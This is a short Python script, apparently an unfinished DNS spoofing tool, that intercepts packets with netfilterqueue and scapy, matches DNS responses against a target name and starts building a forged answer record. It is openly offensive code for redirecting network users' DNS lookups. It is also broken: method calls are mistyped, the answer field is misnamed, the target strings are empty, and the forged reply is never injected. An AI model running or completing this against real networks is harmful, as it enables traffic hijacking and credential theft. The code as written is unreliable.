import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get.payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet(scapy.DNSQR).qname
        if "" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdate="")



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


